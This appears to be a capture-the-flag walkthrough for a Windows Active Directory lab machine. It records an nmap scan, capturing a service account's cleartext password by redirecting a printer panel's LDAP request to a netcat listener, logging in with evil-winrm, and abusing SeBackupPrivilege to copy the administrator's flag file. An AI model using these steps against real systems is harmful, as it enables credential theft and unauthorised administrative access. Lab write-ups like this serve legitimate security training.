#windows #active-directory 

# NMAP scan

```shell
Nmap scan report for 10.129.95.241
Host is up (0.0018s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-10 16:40:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows


```

# Port 80 has a printer that sends credentials to port 389, modified the ip and created a netcat server to receive the request that contains svc-printer credentials

```shell
nc -lnvp 389
```

```shell
svc-printer:1edFg43012!!
```

# user has read access on admin shares


```shell
cme smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --shares
```

# gained shell using evil-winrm

```shell
evil-winrm -ip 10.129.95.241 -u svc-printer -p '1edFg43012!!'

```

# svc-printer is a member of backup operator group

```powershell

whoami /all

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


```


# Downloaded the [SeBackup dll files](https://github.com/k4sth4/SeBackupPrivilege), imported and configured it to the machine, then used a powerview command to copy the root.txt flag from Administrator to the user's folder


```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents\SeBackupPrivilege> import-module ./SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc-printer\Documents\SeBackupPrivilege> import-module ./SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\Users\svc-printer\Documents\SeBackupPrivilege> Set-SeBackupPrivilege # configured the dll files
*Evil-WinRM* PS C:\Users\svc-printer\Documents\SeBackupPrivilege> Get-SeBackupPrivilege
*Evil-WinRM* PS C:\Users\svc-printer\Documents\SeBackupPrivilege> Copy-FileSeBackupPrivilege C:/Users/Administrator/Desktop/root.txt ./root.txt

```

